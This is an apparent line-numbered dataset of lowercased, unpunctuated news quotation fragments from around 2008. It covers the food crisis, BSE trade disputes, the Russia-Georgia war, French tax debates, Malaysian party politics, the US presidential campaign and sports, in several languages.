8609777 my children are used to eating rice all year round but thats very difficult now
8609778 i cant ask my children to change just like that but if they start eating foutou yam and plaintain once a week they will start to like it
8609779 we will do both because that way it will cost less to eat
8609780 rice is an important part of the asian diet and i must have it at every meal
8609781 food crisis forces malaysia into barter palm oil for rice
8609782 multinationals make billions in profit out of growing global food crisis

8609784 we will use every means available to us to ensure that countries rapidly take steps to align their requirements with international standards
8609785 this feed ban remains the weakest out of all the countries that are working to control bse the us is removing only two of the high risk tissues
8609786 as the means for certifying compliance with standards on hormones antibiotics and other residues
8609787 a movement among central american poultry producers to block entry of us poultry and products through the use of sanitary technical barriers
8609788 recognise the equivalence of the us food safety and inspection system
8609789 the best market access arrangements for poultry ever negotiated in a free trade agreement
8609790 the united states can do what they want at home but european consumers have other demands

8609794 environmental regulation and food safety studies of protection and protectionism
8609795 govt asks eu to lift paranoid health related trade barriers
8609796 government asks court to block wider testing for mad cow
8609797 in the absence of a good food safety system run by the us government we supplement with our own
8609798 walks on a razors edge and does so in a world that stands on the edge of a precipice
8609799 cuba is the most interesting addition that can be made to our system of states
8609800 africanized like haiti with all the attendant horror for the white race
8609801 destroy everything within our cannons range of fire impose a harsh blockade so that hunger runs rampant undermine the peaceful population and decimate the cuban army
8609802 was more of an appendage of the us than a sovereign nation
8609803 the use of force and violence or the threat of force and violence to intimate coerce or control in order to advance ideological political religious or economic interests
8609804 the poor and underprivileged i e exploited might demand opportunities for a decent living
8609805 this reminds me of the shepherds way fire in february 2005 in which hundreds of sheep were killed where no arrests were made in the arson
8609806 i wonder if there is any potential relation between the fires second why were they keeping 6 500 pigs in one barn that sounds like a pretty intensive operation that raises its own concerns about humaneness
8609807 guns n roses representatives have been made aware of the arrest and are leaving the matter to the authorities
8609808 in addition mobile phone manufacturers will be put under pressure to maintain healthy margins while they intend to further break through in the emerging markets to increase sales

8609810 a citizen sees the beating in a parking lot police get there fast they see him beating her its a good solid case

8609814 as part of the commander in chiefs order there will be a few more launches of this particular missile before the end of the year
8609815 yeah i guess you have a point there but dont blame us because we are such big barnacleheads
8609816 j e veux la rupture avec ce conformisme intellectuel qui nous oblige penser que l conomie et le social sont antinomiques la question sociale nest ni de droite ni de gauche je veux sortir par le haut des faux d bats et d passer les anciennes oppositions
8609817 il y a un an on nous a expliqu que le capital tait trop tax et on a baiss les droits de succession pour quoi ce qui tait vrai il y a un an ne le serait il plus aujourdhui
8609818 cr er des imp ts nouveaux je nai pas compris que c tait dans le programme de lump souligne t il si chaque fois quon a une bonne id e et le rsa en est une on cr e un imp t nouveau on nest pas sorti de lauberge
8609819 dans un contexte o depuis plusieurs ann es les salaires progressent beaucoup moins vite que les revenus du capital il nest pas anormal que les revenus du capital soient mis contribution pour revaloriser le travail des plus d munis sil y a de largent pour le haut il doit aussi y avoir de largent pour le bas
8609820 r partir le pouvoir dachat de mani re plus juste
8609821 et pierre m haignerie pr sident de la commission des affaires sociales de lassembl e nationale jugeait le mode de financement l gitime
8609822 on a toujours demand plus de justice fiscale on ne va pas se plaindre
8609823 il y a quand m me plus de l gitimit financer les revenus des plus modestes par une contribution des plus riches
8609824 cette manie des gouvernements de droite comme de gauche qui consiste cr er des taxes en plus sans que cela donne de bons r sultats
8609825 tout le monde ne peut qu tre favorable au rsa a t elle convenu mais ce nest pas un bon principe que de le financer par une taxe suppl mentaire la priorit est de tout faire pour obtenir la meilleure croissance possible peut on le faire en augmentant les pr l vements obligatoires
8609826 dans un march morose la fiscalisation des sources d pargne nest pas une bonne chose
8609827 this changes the strategic relationship between the us and poland there is a clear and explicit understanding that if there are negative consequences of stationing the missile shield the us will come to polands defense
8609828 in no way is the presidents plan for missile defense aimed at russia its to protect our european allies from any rogue threats
8609829 the strategic significance of the system consists of intercepting those few dozen missiles moscow can launch following a first strike its a crucial element to develop a nuclear first strike capacity against russia the original plan is for ten interceptor missiles in poland but once established their number could be easily increased
8609830 guarantee s a us edge to carry out nuclear war without risking a counter strike
8609831 were at war against determined enemies and we must not rest until that war is won
8609832 stands for freedom around the world now the world must stand for freedom in georgia
8609833 every nation in every region now has a decision to make either you are with us or you are with the terrorists
8609834 no one with good intentions towards us and the west should
8609835 moscows willingness to crush georgia with overwhelming force and claims the kremlin has 10 times as many tactical short range warheads as the us
8609836 pugnacious russia determined to acquire economic and military power and not afraid to use threats and force to get its way with nuclear weapons central to the russian geopolitical calculus
8609837 the dark days of communist yore and captures the threat of what we and russias neighbors are up against
8609838 very dangerous game and perhaps one the russians want to reconsider
8609839 immediately and unconditionally cease its military operations and withdraw all forces from sovereign georgian territory
8609840 nato can act to stabiliz e this very dangerous situation
8609841 now is the time for action not just words russia must halt its violation of georgian airspace and withdraw its ground forces from georgia with international monitors to verify that these obligations are met
8609842 making putin pay and turning russias georgian rout into a political defeat
8609843 to remove president saakasvili from the office to which he was elected in 2004 and to overthrow a democratic government
8609844 western authorities to explore the vulnerability of russian assets abroad or at least make life difficult for the holders of those assets
8609845 in the world of global commerce china calculated that staging an olympic extravaganza could enhance its ambivalent reputation by contrast the putin government seems to believe its power grows in sync with its reputation as an international pariah an outsider state
8609846 russia has damaged its credibility and its relations with the nations of the free world
8609847 russian tanks rolling through georgia with images of chechnya in 1994 and 99 vilnius 91 afghanistan 79 prague 68 hungary 56 and before that poland the baltics and other eastern european states
8609848 the war in georgia marks an easy return to territorial expansion and attempted regional dominance
8609849 tried to give russians an alternative narrative he put forward democracy as a unifying and legitimizing idea for the new russian state
8609850 young democracies around russia back into moscows sphere of influence the worldview of a russian nationalist is hard for outsiders to comprehend
8609851 kremlin capitalism is a threat to the west by using its market strength in oil and gas resources to strong arm its neighbors and outmaneuver the us and eu
8609852 is to replace a pro western government with a new russian satellite reminiscent of the brezhnev doctrine its part of a broader campaign to annex new territory expand the russian empire conduct cyber attacks against the baltic states assassinate enemies and use economic intimidation through cutoffs of russian oil and gas shipments to ukraine and the czech republic it is important that moscow pays a concrete and tangible price for its latest aggression at least comparable to what it paid for the 1979 invasion of afghanistan
8609853 burned and houses broken unburied bodies lay rotting fresh graves were dug in gardens and basements most victims interviewed were ethnic georgians in central georgian villages some killings were carried out for revenge some involved theft and still others seemed to be that the power balance was shifting away from ethnic georgians to the ossetian separatists and their russian backers
8609854 georgians living in several of the villages said the russians occupying their land had treated them well done nothing to encourage them to leave and offered the only protection available from the south ossestian militias they feared most
8609855 us sees much to fear in a hostile russia by usher ing in a sustained period of renewed animosity with the west problems extend ing far beyond arms deals with syria and the mountains of georgia
8609856 the hegemon in that region and we are not and thats a fact
8609857 any kind of coercive actions like economic sanctions or anything else
8609858 abkhazia rallie d for independence and the abkhazian parliament has approved an official appeal to russia to recognize its independence
8609859 russia is always with you and will never leave you in the lurch
8609860 the kremlin is nearing formal recognition of south ossetia and abkhazia possibly as early as next week
8609861 support is likely and that after all the events that have occurred one should not expect otherwise
8609862 appealed to russia and to governments of other countries to recognize abkhazias independence
8609863 express such a will and if the russian president makes a relevant decision on this score
8609864 again said they will never agree to remain within georgia
8609865 in accordance with the international agreements to their previous places of deployment
8609866 envisaged in the international agreement poti is outside of the security zone
8609867 but that does not mean we will sit behind a fence watching them riding around in hummers
8609868 we have registered an increase in georgian reconnaissance activities and preparations for armed actions in the georgian south ossetian conflict zone
8609869 temporarily suspending military cooperation with nato until a political decision on relations
8609870 now we see russian forces which responded to attacks on russian peacekeepers in south ossetia legitimately
8609871 local s ossetian and abkhazian population said they fear georgia might repeat its regional aggression they also want russian troops to stay in the area to shield them from any possible attacks
8609872 to deter looters and the transportation of arms and ammunition
8609873 the eurasian corridor pipeline geopolitics and the new cold war
8609874 intimately related to the control over energy pipeline and transportation corridors and cites evidence that the georgian august 7 attack was carefully planned in high level consultations between us and nato officials
8609875 coordinat ion with natos plans to strengthen its black sea naval presence
8609876 silk road strategy the trans eurasian security system as an essential building block of post cold war us foreign policy
8609877 an energy and transport corridor network linking western europe to central asia and eventually to the far east
8609878 effective cooperation in politics trade and economy science and technology
8609879 we stand at the brink of a second nuclear age not since hiroshima and nagasaki has the world faced such perilous choices
8609880 he will be fine its not life threatening or anything like that but he does have some broken bones and hes stable the crash was on the m1 around the leicester nottingham area and while it was a bad crash in the grand scheme of things its very mendable
8609881 pertemuan yang diumumkan oleh perdana menteri datuk seri abdullah ahmad badawi 20 julai lepas saya langsung tidak tahu walaupun saya naib presiden pas
8609882 jadi macam mana saya hendak mengatur supaya perjumpaan mereka gagal sedangkan saya tidak diberitahu walaupun saya naib presiden pas
8609883 dalam mesyuarat pun tidak pernah dimaklumkan adanya perjumpaan pemimpin pas dengan pemimpin umno jadi tidak timbul masalah saya hendak ganggu perjumpaan tersebut
8609884 tugas terpenting buat husam ialah untuk mempengaruhi mursyidul am supaya datuk nik abdul aziz nik mat juga tidak bersetuju dengan sebarang bentuk pertemuan di antara pas dan umno
8609885 satu rekaan daripada orang orang yang mempunyai agenda mereka sendiri
8609886 saya mempunyai aturcara peribadi saya sendiri tidak ada kena mengena dengan lawatan anwar saya tidak tahu beliau anwar berada di sana emiriyah arab bersatu
8609887 saya berucap terlebih dahulu dan beliau anwar sampai semasa saya sedang berucap kemudian selepas habis ucapan kami pulang ke hotel masing masing keesokan pagi saya berlepas ke syria
8609888 jadi tidak ada masa untuk kami berbincang tiada perbincangan sama sekali
8609889 dan biasanya character assassination serangan peribadi yang dilakukan apabila seseorang itu dianggap mempunyai satu satu kedudukan yang tertentu
8609890 kalaulah dia tulis itu satu kebenaran bukan satu serangan peribadi ataupun fitnah dia kena berani tampil memperkenalkan dirinya
8609891 kalau serangan dia buat bertopeng seperti ini awal awal lagi menunjukkan apa yang mereka tulis itu bukan satu kebenaran kalau benar mesti dia berani tampilkan dirinya
8609892 jadi saya hadir dalam majlis majlis pakatan rakyat itu adalah satu tindakan pelaksanaan ke atas apa yang telah diputuskan oleh parti dalam muktamar pas tersebut
8609893 jadi saya hairan bagaimana penulis blog ini tidak menghayati keputusan parti tetapi bercakap seolah olah mempertahankan kepentingan parti
8609894 jadi penulis blog ini pada pendapat saya satu daripada agenda umno untuk memecahbelahkan kepimpinan pas

8609901 depending on how it accounts for churn its growth dwarfs vodacoms growth of 1 over the same period
8609902 the battles it has won recently are just that battles not the whole war
8609903 however if it continues to win battles it could pick up another five percentage points in market share
8609904 there has been a lot of questioning of our data strategy so we are looking at it
8609905 republicans said i was too young and too inexperienced to be commander in chief sound familiar it didnt work in 1992 and it will not work in 2008
8609906 barack obama is ready to be president of the united states
8609907 he has the intelligence and curiosity every successful president needs
8609908 his policies on the economy taxes health care and energy are far superior to the republican alternatives

8609911 with the final line up for the icc world twenty20 now decided all three associate teams know where and when they will be playing
8609912 on that basis we are expecting an increasing demand for tickets from supporters of those countries and we are looking at ways of addressing that because we want to ensure as many people as possible following those teams get the chance to catch the action
8609913 we are working with both our ticketing partners and the cricket boards of ireland the netherlands and scotland to ensure we get this right and we will keep the public updated as the process continues

8609916 now the oil companies are placing their bets on john mccain bankrolling his campaign and gambling with our future
8609917 explains why he wants to give another 4 billion tax break to oil companies
8609918 at a time when america should be working harder than ever to develop new clean sources john mccain wants more of the same and has taken more than a million dollars in campaign donations from the oil and gas industry now he wants to give the oil companies another 4 billion in tax breaks four billion in tax breaks for big oil
8609919 john mccain calls himself a maverick but he votes with george bush 90 percent of the time thats not a maverick thats a sidekick
8609920 and guess who voted with president bush 90 percent of the time sen john mccain
8609921 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8609922 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8609923 i think weve got a good corps to work with potentially
8609924 at least from the place kicking standpoint im a lot more optimistic than maybe i would have been a couple weeks ago and i think the same thing about our returners
8609925 if we dont start getting a lot of injuries that type of thing i think we have the potential to be better there
8609926 ryan last year as a freshman had his ups and downs especially early
8609927 but i think he kind of grew and matured as the season went on and were hoping that he picks up from where he left off last year
8609928 you know ryan has a tremendous leg but with a lot of young players you need to see them be more consistent
8609929 one of our main criticisms is that we need to get more consistent and i think thats what we work at every day
8609930 going into this year theres not as much surprise its just a matter of going out there every day and doing it
8609931 analysis and integration of professionally gathered data for understanding its implications and for speculating freely about the potential applications

8609935 van de nieuwe nederlanders kun je geen tweederangs nederlanders maken ze zullen vergelijkbare posities moeten krijgen met de inwoners van nederland dat is ingewikkeld
8609936 je zult toch eerst de grondwet en het statuut moeten wijzigen voordat je al die verschillen kunt aanbrengen
8609937 dan zit je al in 2012 of 2013 voor je de zaak rond kunt krijgen misschien dat wel de positie van de nieuwe landen in 2010 is te realiseren maar de nieuwe positie van de bes eilanden is heel ingewikkeld
8609938 je kunt niet de staten vijf of zes jaar laten zitten
8609939 the thing i like about wisconsin right now is were unique
8609940 five years ago when the spread first started coming into the league you needed preparation versus those teams
8609941 for us now wisconsin is unique you line up with a fullback and tailback and have some big ugly guys in front who come downhill its a different preparation
8609942 i think the skys the limit for us and all we look to do is keep going uphill
8609943 you dont need a weather man to know which way the wind blows

8609948 i have known and been friends with john mccain for almost 22 years but every day now i learn something new about candidate mccain
8609949 to those who still believe in the myth of a maverick instead of the reality of a politician i say lets compare senator mccain to candidate mccain candidate mccain now supports the very war time tax cuts that senator mccain once called irresponsible candidate mccain criticizes senator mccains own climate change bill candidate mccain says he would vote against the immigration bill that senator mccain wrote are you kidding me folks talk about being for it before you were against it let me tell you before he ever debates barack obama john mccain should finish the debate with himself
8609950 this election is a chance for america to tell the merchants of fear and division you dont decide who loves this country you dont decide who is a patriot you dont decide whose service counts and whose doesnt four years ago i said and i say it again tonight that the flag doesnt belong to any ideology it doesnt belong to any political party it is an enduring symbol of our nation and it belongs to all the american people after all patriotism is not love of power or some cheap trick to win votes patriotism is love of country
